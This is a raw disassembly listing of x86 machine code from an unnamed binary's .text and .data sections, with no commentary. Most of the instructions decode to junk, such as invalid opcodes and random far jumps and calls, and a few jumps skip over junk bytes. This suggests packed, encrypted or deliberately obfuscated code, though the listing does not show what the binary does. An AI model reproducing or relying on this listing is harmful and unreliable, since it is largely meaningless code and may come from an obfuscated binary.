  41c665:	mov    DWORD PTR [ebx],esi
  41c667:	loopne 0x41c6ab
  41c669:	scas   al,BYTE PTR es:[edi]
  41c66a:	or     BYTE PTR [ebx],bh
  41c66c:	add    ah,bh
  41c66e:	fsub   QWORD PTR [ebx+0x45]
  41c671:	mov    ds:0xff3802da,eax
  41c676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c677:	cwde   
  41c678:	aaa    
  41c679:	int3   
  41c67a:	cs inc edi
  41c67c:	jne    0x41c630
  41c67e:	push   ebp
  41c67f:	das    
  41c680:	mov    gs,WORD PTR [esi-0x76]
  41c683:	stos   BYTE PTR es:[edi],al
  41c684:	repz jae 0x41c6f5
  41c687:	xor    ebx,ebx
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x1dc0773e,eax
  41c6cc:	outs   dx,DWORD PTR ds:[esi]
  41c6cd:	jl     0x41c6cf
  41c6cf:	icebp  
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c6c7
  41c6d7:	outs   dx,DWORD PTR ds:[esi]
  41c6d8:	sub    DWORD PTR [eax+0x21],ecx
  41c6db:	js     0x41c727
  41c6dd:	dec    esp
  41c6de:	sbb    DWORD PTR [edi],ebx
  41c6e0:	fdiv   QWORD PTR [eax]
  41c6e2:	mov    esi,0x1770de7c
  41c6e7:	ret    0x4087
  41c6ea:	shl    BYTE PTR [edx-0x45],1
  41c6ed:	mov    WORD PTR [ebp+0x71],cs
  41c6f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6f1:	mov    dh,0x39
  41c6f3:	pop    edx
  41c6f4:	cdq    
  41c6f5:	cdq    
  41c6f6:	data16 out dx,ax
  41c6f9:	(bad)  [edi-0x32]
  41c6fc:	and    BYTE PTR [eax],ch
  41c6fe:	icebp  
  41c6ff:	push   eax
  41c700:	fsub   st(1),st
  41c702:	imul   eax,DWORD PTR [eax+0xe78dd84],0xd1eea0a9
  41c70c:	in     eax,0xe8
  41c70e:	test   eax,0xefbd5e39
  41c713:	lock pop ebx
  41c715:	cmp    DWORD PTR [eax+0x2f],eax
  41c718:	xor    cl,BYTE PTR [eax-0x32]
  41c71b:	loop   0x41c6df
  41c71d:	and    DWORD PTR [eax+ebp*1],esi
  41c720:	mov    BYTE PTR [esi-0x18],dh
  41c723:	out    dx,eax
  41c724:	cmp    eax,0x2468c067
  41c729:	sub    al,BYTE PTR [ecx+0x19]
  41c72c:	pcmpeqw mm0,QWORD PTR [edi+0xd]
  41c730:	cdq    
  41c731:	retf   0xaf9
  41c734:	sub    BYTE PTR [ebp+ecx*2+0x1d],al
  41c738:	jge    0x41c779
  41c73a:	mov    cl,0xf3
  41c73c:	imul   edx,DWORD PTR ds:0x25892efa,0xffffff87
  41c743:	les    ebx,FWORD PTR [ebp+0x1c6a589e]
  41c749:	xchg   BYTE PTR [eax+0x10c0226e],ah
  41c74f:	push   ecx
  41c750:	xchg   ecx,eax
  41c751:	push   es
  41c752:	cmc    
  41c753:	jl     0x41c6ee
  41c755:	int3   
  41c756:	inc    BYTE PTR ds:0xe0995b32
  41c75c:	retf   0xc52
  41c75f:	fadd   DWORD PTR [ebp-0x68110cc3]
  41c765:	cli    
  41c766:	(bad)  
  41c767:	iret   
  41c768:	in     al,0xab
  41c76a:	xchg   DWORD PTR [edx],ebx
  41c76c:	popa   
  41c76d:	mov    eax,ds:0xb5d34301
  41c772:	mov    ds:0x1f81f2b8,al
  41c777:	shl    bl,1
  41c779:	xlat   BYTE PTR ds:[ebx]
  41c77a:	mov    esp,0xcb3141bd
  41c77f:	xchg   edx,eax
  41c780:	(bad)  
  41c781:	je     0x41c739
  41c783:	daa    
  41c784:	push   eax
  41c785:	aaa    
  41c786:	mov    esp,0xb197ea0d
  41c78b:	adc    esi,DWORD PTR [edi]
  41c78d:	sbb    ecx,ebp
  41c78f:	inc    edi
  41c791:	sub    esp,0x1d
  41c794:	repz jns 0x41c78a
  41c797:	mov    DWORD PTR [edx],ebx
  41c799:	mov    ah,0xa9
  41c79b:	iret   
  41c79c:	addr16 inc ebp
  41c79e:	test   eax,0xc34906fd
  41c7a3:	and    edx,DWORD PTR [ebx+0x70]
  41c7a6:	push   esp
  41c7a7:	ror    edi,cl
  41c7a9:	jecxz  0x41c73c
  41c7ab:	ss aaa 
  41c7ad:	xor    al,0xa5
  41c7af:	sbb    al,0x5
  41c7b1:	mov    bh,0x8f
  41c7b3:	fnstsw WORD PTR [ecx+0x5dca3f9f]
  41c7b9:	out    dx,eax
  41c7ba:	call   0x977449b2
  41c7bf:	push   cs
  41c7c0:	in     eax,0x64
  41c7c2:	loope  0x41c7bd
  41c7c4:	or     DWORD PTR [eax],esi
  41c7c6:	xor    esi,DWORD PTR [ecx+0x6f]
  41c7c9:	cmp    ebx,DWORD PTR [ecx]
  41c7cb:	mov    esp,0x641854bb
  41c7d0:	xchg   DWORD PTR ds:0xdbcf1b9b,edx
  41c7d6:	push   cs
  41c7d7:	repnz add BYTE PTR [ecx+0x17],al
  41c7db:	xor    eax,0x347b79cc
  41c7e0:	jmp    0xbd18:0xbaad5c90
  41c7e7:	jp     0x41c7a3
  41c7e9:	les    ebx,FWORD PTR ds:0x4fdd1bd4
  41c7ef:	cmp    al,0x8
  41c7f1:	fisttp DWORD PTR [edi+edi*8]
  41c7f4:	(bad)  
  41c7f5:	loop   0x41c86c
  41c7f7:	xor    dl,ch
  41c7f9:	or     eax,0x7803f60c
  41c7fe:	jnp    0x41c79c
  41c800:	addr16 pop edx
  41c802:	xor    cl,BYTE PTR [eax-0x27]
  41c805:	inc    esi
  41c806:	mov    ss,WORD PTR [eax+ecx*4]
  41c809:	adc    BYTE PTR [ebx-0x13505ef5],dh
  41c80f:	xor    BYTE PTR [edi+0x1d],ah
  41c812:	cwde   
  41c813:	xor    ebx,DWORD PTR [edx-0x12]
  41c816:	add    al,0xc0
  41c818:	pop    ds
  41c819:	hlt    
  41c81a:	shl    DWORD PTR [edx-0x69],1
  41c81d:	pop    ss
  41c81e:	sbb    eax,0xb66c3624
  41c823:	xchg   esp,eax
  41c824:	je     0x41c7da
  41c826:	push   edx
  41c827:	fwait
  41c828:	pop    ds
  41c829:	pop    ecx
  41c82a:	mov    bh,0x14
  41c82c:	xor    bh,BYTE PTR [eax+0x64b64457]
  41c832:	mov    ch,0x14
  41c834:	and    eax,0x7060515b
  41c839:	dec    esp
  41c83a:	rcl    DWORD PTR [ecx-0x62],cl
  41c83d:	inc    ebx
  41c83e:	cs push ebp
  41c840:	sbb    al,0x5d
  41c842:	lds    ebx,FWORD PTR [ebx-0x19]
  41c845:	in     eax,0xda
  41c847:	add    al,0xa4
  41c849:	js     0x41c83d
  41c84b:	in     al,dx
  41c84c:	sbb    esp,ecx
  41c84e:	jno    0x41c7d8
  41c850:	mov    dl,ch
  41c852:	dec    edi
  41c853:	jle    0x41c899
  41c855:	and    bl,BYTE PTR [ecx]
  41c857:	les    ebx,FWORD PTR [eax+0x415913eb]
  41c85d:	call   0xc42b1d7d
  41c862:	sahf   
  41c863:	xchg   ebp,eax
  41c864:	lods   al,BYTE PTR ds:[esi]
  41c865:	and    dl,cl
  41c867:	xor    al,0xb0
  41c869:	jmp    0x697e:0x3aa4bfe8
  41c870:	hlt    
  41c871:	cs pop edx
  41c873:	or     ecx,DWORD PTR [ebx]
  41c875:	pop    esp
  41c876:	in     al,dx
  41c877:	xchg   ecx,eax
  41c878:	mov    ah,BYTE PTR [eax-0x7a]
  41c87b:	mov    ch,0x4a
  41c87d:	outs   dx,DWORD PTR ds:[esi]
  41c87e:	dec    esi
  41c87f:	stc    
  41c880:	jg     0x41c844
  41c882:	(bad)  
  41c883:	adc    edx,DWORD PTR [edx+ebp*2+0x5a4aa497]
  41c88a:	push   ds
  41c88b:	and    eax,0x2a75d922
  41c890:	pop    ebp
  41c891:	jbe    0x41c816
  41c893:	adc    eax,0x95914246
  41c898:	idiv   DWORD PTR [ecx-0x52]
  41c89b:	xchg   BYTE PTR [edi],al
  41c89d:	and    cl,al
  41c89f:	dec    edi
  41c8a0:	pop    ebx
  41c8a1:	cmp    al,0x2f
  41c8a3:	idiv   BYTE PTR [edi-0x51]
  41c8a6:	mov    dl,0xc9
  41c8a8:	jmp    0x41c861
  41c8aa:	push   0xffffffda
  41c8ac:	outs   dx,BYTE PTR ds:[esi]
  41c8ad:	js     0x41c928
  41c8af:	ja     0x41c8de
  41c8b1:	mov    ds:0x1754d8ef,al
  41c8b6:	retf   0xcba6
  41c8b9:	fstp   DWORD PTR [eax-0x12f0ccd]
  41c8bf:	lods   al,BYTE PTR ds:[esi]
  41c8c0:	xchg   esi,eax
  41c8c1:	scas   al,BYTE PTR es:[edi]
  41c8c2:	sbb    ax,0x146d
  41c8c6:	jo     0x41c8f5
  41c8c8:	pop    esi
  41c8c9:	xchg   edx,eax
  41c8ca:	or     ecx,DWORD PTR [edi+0x53a11f7d]
  41c8d0:	push   ebp
  41c8d1:	shl    DWORD PTR [ecx+0x4a],1
  41c8d4:	push   edi
  41c8d5:	add    ebx,DWORD PTR [edx+ebx*1+0xd]
  41c8d9:	test   BYTE PTR [eax],dl
  41c8db:	aas    
  41c8dc:	mov    esi,DWORD PTR [ebx]
  41c8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8df:	pop    edi
  41c8e0:	arpl   di,ax
  41c8e2:	xchg   edi,eax
  41c8e3:	adc    ah,dh
  41c8e5:	popf   
  41c8e6:	mov    ebx,0xaa4456c1
  41c8eb:	pop    edi
  41c8ec:	mov    dh,0x9a
  41c8ee:	dec    edx
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	ficom  DWORD PTR [edi]
  41c911:	sbb    al,0xbe
  41c913:	sbb    bh,dh
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c8c8
  41c91c:	fbstp  TBYTE PTR [edi-0x308bddcb]
  41c922:	xor    ecx,DWORD PTR ds:0x9def722d
  41c928:	jecxz  0x41c969
  41c92a:	loope  0x41c914
  41c92c:	push   ebp
  41c92d:	push   ds
  41c92e:	imul   eax,edx,0xfd2964b7
  41c934:	mov    al,0x80
  41c936:	outs   dx,DWORD PTR ds:[esi]
  41c937:	hlt    
  41c938:	push   ebx
  41c939:	or     DWORD PTR [edi],0x2762b4e6
  41c93f:	pop    eax
  41c940:	ror    DWORD PTR [ebx],0xac
  41c943:	je     0x41c8ea
  41c945:	mov    eax,0xbf5213cb
  41c94a:	enter  0x2940,0x8c
  41c94e:	jbe    0x41c952
  41c950:	dec    ebp
  41c951:	(bad)  
  41c953:	ja     0x41c995
  41c955:	int    0x13
  41c957:	inc    esi
  41c958:	(bad)  
  41c95a:	pop    ebx
  41c95b:	pop    edi
  41c95c:	pusha  
  41c95d:	shr    DWORD PTR [ebp+0x65],0x49
  41c961:	adc    eax,esp
  41c963:	inc    eax
  41c964:	push   esp
  41c965:	add    dh,BYTE PTR [edx+0x69]
  41c968:	lods   eax,DWORD PTR ds:[esi]
  41c969:	push   esp
  41c96a:	pop    ecx
  41c96b:	mov    ds:0xe45cecaa,eax
  41c970:	sub    esi,DWORD PTR [ebx]
  41c972:	sar    DWORD PTR [edx+0x59],1
  41c975:	retf   0x6e8b
  41c978:	mov    cl,0x3c
  41c97a:	stc    
  41c97b:	jae    0x41c9ad
  41c97d:	xor    bl,cl
  41c97f:	cli    
  41c980:	xchg   edi,eax
  41c981:	pop    ss
  41c982:	jo     0x41c96f
  41c984:	sar    BYTE PTR [ecx+0x19],cl
  41c987:	dec    ebx
  41c988:	scas   eax,DWORD PTR es:[edi]
  41c989:	sub    ecx,DWORD PTR ds:0x84c186b
  41c98f:	dec    ebx
  41c990:	mov    edi,gs
  41c992:	xchg   al,ah
  41c994:	xor    edi,DWORD PTR [eax+0x540b1600]
  41c99a:	call   0x92b9:0xe45e56c
  41c9a1:	jl     0x41c9e9
  41c9a3:	les    eax,FWORD PTR [ebp+0x39aebb43]
  41c9a9:	push   cs
  41c9aa:	mov    bl,0xb0
  41c9ac:	dec    ecx
  41c9ad:	in     al,0x24
  41c9af:	jns    0x41c99c
  41c9b1:	cmc    
  41c9b2:	pop    esp
  41c9b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b4:	outs   dx,DWORD PTR ds:[esi]
  41c9b5:	aam    0x1c
  41c9b7:	arpl   WORD PTR [ecx],ax
  41c9b9:	jecxz  0x41c9ab
  41c9bb:	cli    
  41c9bc:	(bad)  
  41c9bd:	mov    dh,0x72
  41c9bf:	cmp    dl,BYTE PTR [eax]
  41c9c1:	mov    ebp,0x159e0ece
  41c9c6:	jmp    0x776a999c
  41c9cb:	out    0x29,al
  41c9cd:	(bad)  
  41c9cf:	das    
  41c9d0:	dec    ebp
  41c9d1:	dec    esp
  41c9d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9d3:	mov    WORD PTR [esi+0x60759965],ss
  41c9d9:	iret   
  41c9da:	cmc    
  41c9db:	mov    edi,0x8beb66c6
  41c9e0:	das    
  41c9e1:	and    DWORD PTR [eax-0x65],edx
  41c9e4:	add    ebp,DWORD PTR [edx]
  41c9e6:	pop    esp
  41c9e7:	push   esp
  41c9e8:	or     esi,DWORD PTR [edi]
  41c9ea:	jp     0x41c9f3
  41c9ec:	mov    bh,0x8e
  41c9ee:	lock repnz cmp BYTE PTR ss:[ebp-0x34ac89f5],ah
  41c9f7:	adc    BYTE PTR [bp-0x642a],ch
  41c9fc:	int    0xe8
  41c9fe:	ror    dl,1
  41ca00:	int3   
  41ca01:	ds into 
  41ca03:	xchg   edx,eax
  41ca04:	in     eax,dx
  41ca05:	js     0x41ca65
  41ca07:	cmp    eax,0x1152b4ae
  41ca0c:	dec    DWORD PTR [eax]
  41ca0e:	out    0xb3,al
  41ca10:	jo     0x41ca46
  41ca12:	out    dx,al
  41ca13:	std    
  41ca14:	dec    edx
  41ca15:	js     0x41ca83
  41ca17:	inc    ecx
  41ca18:	(bad)  
  41ca19:	outs   dx,DWORD PTR ds:[esi]
  41ca1a:	in     eax,dx
  41ca1b:	dec    BYTE PTR [ebx-0x34]
  41ca1e:	(bad)
  41ca21:	mov    dh,0x8d
  41ca23:	(bad)  [esp+ebx*4-0x51]
  41ca27:	ja     0x41ca48
  41ca29:	cmp    eax,0xc95c6a3d
  41ca2e:	sub    al,0xaa
  41ca30:	ins    BYTE PTR es:[edi],dx
  41ca31:	lahf   
  41ca32:	ins    DWORD PTR es:[edi],dx
  41ca33:	mov    bl,0xfd
  41ca35:	mov    edx,0xbce70753
  41ca3a:	sbb    DWORD PTR [esi+0x76],esp
  41ca3d:	pop    edx
  41ca3e:	sbb    eax,0x426ebb52
  41ca43:	and    ebp,DWORD PTR [ebx]
  41ca45:	pop    eax
  41ca46:	xlat   BYTE PTR ds:[ebx]
  41ca47:	add    eax,esi
  41ca49:	cmp    eax,0xe6190f78
  41ca4e:	push   ecx
  41ca4f:	in     eax,0x75
  41ca51:	sbb    cl,dh
  41ca53:	cmp    dh,bl
  41ca55:	loopne 0x41ca58
  41ca57:	gs dec esi
  41ca59:	sub    al,dl
  41ca5b:	neg    ebx
  41ca5d:	jae    0x41ca0b
  41ca5f:	jecxz  0x41ca1a
  41ca61:	popa   
  41ca62:	(bad)  
  41ca63:	xor    eax,0x19ed83dd
  41ca68:	into   
  41ca69:	xchg   eax,ebx
  41ca6b:	loop   0x41caeb
  41ca6d:	aam    0xd0
  41ca6f:	pusha  
  41ca70:	adc    DWORD PTR [edx+eiz*8+0x3a644fae],esi
  41ca77:	cmp    al,0x48
  41ca79:	adc    dl,BYTE PTR [ecx+0x16fcde4d]
  41ca7f:	ror    bl,0x4f
  41ca82:	pop    ecx
  41ca83:	xor    esp,DWORD PTR [ebx+0x4ada1225]
  41ca89:	adc    eax,0xbe720b4
  41ca8e:	mov    esi,0xda096c73
  41ca93:	out    dx,al
  41ca94:	inc    ebx
  41ca95:	lods   al,BYTE PTR ds:[esi]
  41ca96:	cmp    esp,DWORD PTR [ecx-0x5da2a94c]
  41ca9c:	js     0x41ca77
  41ca9e:	adc    DWORD PTR [edx+0x5],ebx
  41caa1:	jo     0x41cae6
  41caa3:	cmp    bl,BYTE PTR [eax+edx*4-0x12]
  41caa7:	mov    al,0xab
  41caa9:	xchg   ebx,eax
  41caaa:	rcl    esp,cl
  41caac:	adc    dl,BYTE PTR [eax-0x21]
  41caaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cab0:	jmp    DWORD PTR [ebx+esi*4+0x32]
  41cab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cab5:	loop   0x41caf1
  41cab7:	push   0x873932b3
  41cabc:	test   eax,0x77e6b53d
  41cac1:	sbb    ch,ch
  41cac3:	call   0x7fc96571
  41cac8:	stc    
  41cac9:	adc    eax,0xd91ce600
  41cace:	test   al,0xd6
  41cad0:	aas    
  41cad1:	sti    
  41cad2:	test   edx,ebx
  41cad4:	test   DWORD PTR [eax],esi
  41cad6:	fmul   QWORD PTR [ebx+0x7d]
  41cad9:	dec    esp
  41cada:	add    al,ch
  41cadc:	sub    al,BYTE PTR [ecx+0x47224248]
  41cae2:	ins    BYTE PTR es:[edi],dx
  41cae3:	pop    esp
  41cae4:	jmp    0x41cb14
  41cae6:	push   es
  41cae7:	rcl    BYTE PTR [edx-0x9],0xe6
  41caeb:	rcr    DWORD PTR [edx+0x39120302],1
  41caf1:	mov    BYTE PTR [ecx-0x24aff73],dh
  41caf7:	stc    
  41caf8:	(bad)  
  41caf9:	push   eax
  41cafa:	cmc    
  41cafb:	stc    
  41cafc:	push   cs
  41cafd:	jmp    0xfd3fb85e
  41cb02:	xor    esp,DWORD PTR [edx-0x5e8025ee]
  41cb08:	frstor [edx]
  41cb0a:	sbb    BYTE PTR [eax],bl
  41cb0c:	(bad)  
  41cb0d:	in     eax,0xf2
  41cb0f:	and    DWORD PTR [edi-0x38],esi
  41cb12:	in     al,dx
  41cb13:	push   cs
  41cb14:	sbb    bl,BYTE PTR [ebp-0x7acb8c23]
  41cb1a:	add    ch,BYTE PTR [ebx]
  41cb1c:	push   cs
  41cb1d:	fistp  DWORD PTR [eax-0x4d0d871a]
  41cb23:	into   
  41cb24:	loope  0x41cada
  41cb26:	adc    ebp,edx
  41cb28:	loopne 0x41cb1f
  41cb2a:	out    dx,eax
  41cb2b:	dec    esi
  41cb2c:	pop    ds
  41cb2d:	call   0x5e4f:0x27c4fce9
  41cb34:	jmp    0x41cd69
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x8b0d6037
  41cb47:	dec    eax
  41cb48:	xor    DWORD PTR [eax],0x10787ff5
  41cb4e:	jle    0x41cbc8
  41cb50:	js     0x41cad6
  41cb52:	xchg   edx,eax
  41cb53:	jge    0x41cb10
  41cb55:	cmp    ecx,DWORD PTR [ebx-0x63]
  41cb58:	dec    eax
  41cb59:	std    
  41cb5a:	popa   
  41cb5b:	xchg   esp,eax
  41cb5c:	xchg   edi,eax
  41cb5d:	adc    al,0xaa
  41cb5f:	(bad)  
  41cb60:	stc    
  41cb61:	leave  
  41cb62:	xlat   BYTE PTR ds:[ebx]
  41cb63:	push   0xffffff93
  41cb65:	idiv   bh
  41cb67:	push   ecx
  41cb68:	fxch   st(5)
  41cb6a:	xor    BYTE PTR [ebx+0x72],al
  41cb6d:	pop    eax
  41cb6e:	(bad)  
  41cb6f:	fstp   DWORD PTR [edi]
  41cb71:	pop    edx
  41cb72:	ds push esi
  41cb74:	push   eax
  41cb75:	dec    esp
  41cb76:	fidivr DWORD PTR [ecx]
  41cb78:	push   0xcd4e9449
  41cb7d:	or     DWORD PTR [edi-0x6],ebx
  41cb80:	jp     0x41cbc8
  41cb82:	dec    edx
  41cb83:	cdq    
  41cb84:	sub    dl,BYTE PTR [ecx]
  41cb86:	leave  
  41cb87:	sub    ebx,DWORD PTR [esi+ebp*2]
  41cb8a:	test   al,0x9f
  41cb8c:	inc    ebx
  41cb8d:	sub    al,0xd0
  41cb8f:	dec    eax
  41cb90:	gs pop ebp
  41cb92:	pop    esi
  41cb93:	push   ebx
  41cb94:	add    BYTE PTR [ebx],0xf3
  41cb97:	mov    ds:0x1892c2f1,eax
  41cb9c:	pop    ss
  41cb9d:	xchg   ecx,eax
  41cb9e:	retf   
  41cb9f:	pop    es
  41cba0:	jmp    0x4db48a78
  41cba5:	jns    0x41cbb9
  41cba7:	scas   al,BYTE PTR es:[edi]
  41cba8:	dec    ebx
  41cba9:	inc    edx
  41cbaa:	mov    bl,0xe9
  41cbac:	push   esi
  41cbad:	cmc    
  41cbae:	adc    eax,0x449cf930
  41cbb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbb4:	(bad)  
  41cbb5:	xchg   ebx,eax
  41cbb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbb7:	test   eax,0x441360cb
  41cbbc:	sub    ecx,DWORD PTR [ebx+0x31e269d6]
  41cbc2:	push   es
  41cbc3:	lock int 0x58
  41cbc6:	sbb    esp,edx
  41cbc8:	mov    esp,0x127f71d5
  41cbcd:	pop    edi
  41cbce:	cdq    
  41cbcf:	or     DWORD PTR ds:0xcc584979,esp
  41cbd5:	jb     0x41cbe1
  41cbd7:	xor    BYTE PTR [ebp+edx*4-0x19],0xbd
  41cbdc:	mov    bh,0xb6
  41cbde:	arpl   WORD PTR [edi-0xb],cx
  41cbe1:	xor    ch,BYTE PTR [eax+ebx*2+0x148fe862]
  41cbe8:	xchg   ebx,eax
  41cbe9:	lds    ebp,FWORD PTR [edi-0x80]
  41cbec:	out    0x45,eax
  41cbee:	das    
  41cbef:	push   cs
  41cbf0:	mov    ?,WORD PTR [edi-0x3]
  41cbf3:	mov    edx,DWORD PTR [edi-0x5]
  41cbf6:	pusha  
  41cbf7:	fcom   QWORD PTR [esi-0x65]
  41cbfa:	int    0x7b
  41cbfc:	cs dec ebx
  41cbfe:	retf   0xe0dd
  41cc01:	jno    0x41cbea
  41cc03:	fcom   DWORD PTR [ecx]
  41cc05:	mov    ebx,ss
  41cc07:	fisubr DWORD PTR [edi+0x77650b5]
  41cc0d:	inc    esp
  41cc0e:	rol    BYTE PTR [eax],0x3e
  41cc11:	in     eax,dx
  41cc12:	adc    eax,0x65c0e711
  41cc17:	adc    dh,BYTE PTR [ebp-0x23]
  41cc1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc1b:	cmp    ebx,DWORD PTR [esi+0x1e96303d]
  41cc21:	lock dec ebx
  41cc23:	dec    edx
  41cc24:	call   0xcd69:0x488eb5c3
  41cc2b:	and    dl,ah
  41cc2d:	dec    edi
  41cc2e:	shl    esi,1
  41cc30:	push   esp
  41cc31:	xor    al,ch
  41cc33:	sbb    BYTE PTR [ebp+0x75261de4],ah
  41cc39:	push   esp
  41cc3a:	jle    0x41cc77
  41cc3c:	inc    edx
  41cc3d:	dec    ebx
  41cc3e:	xor    ecx,ebx
  41cc40:	call   0x77c035c5
  41cc45:	imul   ebp,DWORD PTR [ebx+0x3f762aa2],0x190c04be
  41cc4f:	jne    0x41cc37
  41cc51:	je     0x41cc87
  41cc53:	retf   0xb79b
  41cc56:	cld    
  41cc57:	pusha  
  41cc58:	and    DWORD PTR [eax-0x10],ebx
  41cc5b:	out    0xd8,al
  41cc5d:	or     al,0x57
  41cc5f:	inc    ebp
  41cc60:	cs adc al,0x83
  41cc63:	xchg   ebp,eax
  41cc64:	popa   
  41cc65:	mov    DWORD PTR [eax],edi
  41cc67:	or     edi,eax
  41cc69:	data16 jle 0x41ccdc
  41cc6c:	sbb    dh,BYTE PTR [esi+0x327f1c1e]
  41cc72:	or     eax,eax
  41cc74:	stc    
  41cc75:	or     esi,DWORD PTR [ebx]
  41cc77:	adc    ebp,ebp
  41cc79:	leave  
  41cc7a:	inc    edi
  41cc7b:	lods   eax,DWORD PTR ds:[esi]
  41cc7c:	leave  
  41cc7d:	adc    ax,0xc924
  41cc81:	in     al,dx
  41cc82:	adc    BYTE PTR [eax-0x23],dh
  41cc85:	mov    BYTE PTR [esi],al
  41cc87:	cmp    edi,DWORD PTR [ecx+0x28f3ed10]
  41cc8d:	cmp    ah,bl
  41cc8f:	push   esi
  41cc90:	cmp    eax,0xd35e426c
  41cc95:	jae    0x41cca3
  41cc97:	shl    ebx,cl
  41cc99:	mov    BYTE PTR [edx-0x6d76dd15],bl
  41cc9f:	push   es
  41cca0:	jg     0x41cc9d
  41cca2:	cld    
  41cca3:	or     esi,DWORD PTR [esi+0x34]
  41cca6:	or     ebx,DWORD PTR [edx]
  41cca8:	jmp    0x96e46687
  41ccad:	fs push 0xff8c091d
  41ccb3:	loope  0x41cd17
  41ccb5:	push   edx
  41ccb6:	je     0x41cd1e
  41ccb8:	xor    al,BYTE PTR [eax-0x237e1846]
  41ccbe:	test   edi,ebp
  41ccc0:	jl     0x41ccfb
  41ccc2:	pop    ebp
  41ccc3:	sar    DWORD PTR [eax-0x289d4651],cl
  41ccc9:	(bad)  
  41cccb:	aam    0x6a
  41cccd:	sub    DWORD PTR [esi+0x25],0x8ce88cd6
  41ccd4:	bound  esp,QWORD PTR [edx]
  41ccd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccd7:	add    ah,BYTE PTR [edx-0x2f]
  41ccda:	jecxz  0x41cc82
  41ccdc:	or     BYTE PTR [edx+eax*2-0x31d972d5],ah
  41cce3:	rol    BYTE PTR [esp+ebx*1-0x740dc849],cl
  41ccea:	sub    eax,0xd77e5af1
  41ccef:	and    dl,BYTE PTR [edi]
  41ccf1:	ss inc esp
  41ccf3:	popf   
  41ccf4:	inc    ecx
  41ccf5:	stos   BYTE PTR es:[edi],al
  41ccf6:	sbb    BYTE PTR [eax+ebx*1],bl
  41ccf9:	add    al,BYTE PTR [ebp-0x1dfa3975]
  41ccff:	sti    
  41cd00:	call   0xc301:0x67060616
  41cd07:	xor    ecx,DWORD PTR [edx]
  41cd09:	gs mov ah,0x2a
  41cd0c:	mov    ch,0xd1
  41cd0e:	shl    DWORD PTR [ebx+0x33],1
  41cd11:	mov    ebx,DWORD PTR [edx]
  41cd13:	cmp    ah,al
  41cd15:	xchg   edi,eax
  41cd16:	call   0xf9f2b3c4
  41cd1b:	enter  0xfdc4,0xc7
  41cd1f:	clc    
  41cd20:	cmp    BYTE PTR [edx-0x6b811400],0xd0
  41cd27:	scas   al,BYTE PTR es:[edi]
  41cd28:	jmp    0xcecf:0xd8f19a0b
  41cd2f:	xor    esp,DWORD PTR [edx-0x1a79c8af]
  41cd35:	and    edi,DWORD PTR [ecx+0x5f5c1346]
  41cd3b:	test   DWORD PTR [ebx+0xf5a6c2d],ebp
  41cd41:	mov    dl,0x89
  41cd43:	mov    bl,0x26
  41cd45:	jecxz  0x41cd64
  41cd47:	clc    
  41cd48:	aam    0xc
  41cd4a:	jecxz  0x41cdb7
  41cd4c:	adc    al,0x63
  41cd4e:	mov    edx,0xe411807c
  41cd53:	push   es
  41cd54:	das    
  41cd55:	int3   
  41cd56:	lods   al,BYTE PTR ds:[esi]
  41cd57:	sbb    BYTE PTR [edx],bh
  41cd59:	xor    eax,0x82fe79bf
  41cd5e:	aas    
  41cd5f:	dec    eax
  41cd60:	dec    edx
  41cd61:	outs   dx,DWORD PTR ds:[esi]
  41cd62:	jge    0x41cd21
  41cd64:	and    eax,0x446dabe2
  41cd69:	pop    ebx
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
